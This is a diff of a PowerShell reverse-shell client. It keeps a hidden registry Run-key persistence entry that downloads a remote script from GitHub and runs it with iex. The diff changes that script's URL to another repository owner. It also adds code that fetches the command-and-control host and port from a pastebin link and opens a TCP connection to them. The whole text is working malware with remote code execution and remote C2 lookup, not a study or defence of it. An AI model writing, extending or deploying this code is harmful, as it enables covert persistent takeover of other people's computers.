@@ -3,11 +3,12 @@
 
 $address = 'localhost'
 $port = 8000
-$scriptURL = 'https://raw.githubusercontent.com/sweetsoftware/ReversePowershell/master/client.ps1'
+$scriptURL = 'https://raw.githubusercontent.com/PhantomControl/ReversePowershell/master/client.ps1'
 $autorunKeyName = "Windows Powershell"
 $autorunKeyVal = 'powershell -WindowStyle Hidden -nop -c "iex (New-Object Net.WebClient).DownloadString(''' + $scriptURL + ''')"'
 
 # Persist
+
 $autoruns = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
 if (-not $autoruns.$autorunKeyName) {
     New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal
@@ -21,8 +22,10 @@ while ($true) {
     # Try to connect to server every 10s
     do {
         try {
-            Write-Host "Trying to reach "$address":"$port
-            $client = New-Object System.Net.Sockets.TcpClient($address, $port)  
+            $Settings = (New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/6Tnt6aG9')
+            $a,$b = $settings.split(":")[0,1]
+	    Write-Host "Trying to reach "$a":"$b
+            $client = New-Object System.Net.Sockets.TcpClient($a, $b)  
             $stream = $client.GetStream()
             $writer = New-Object System.IO.StreamWriter($stream)
             $reader = New-Object System.IO.StreamReader($stream)
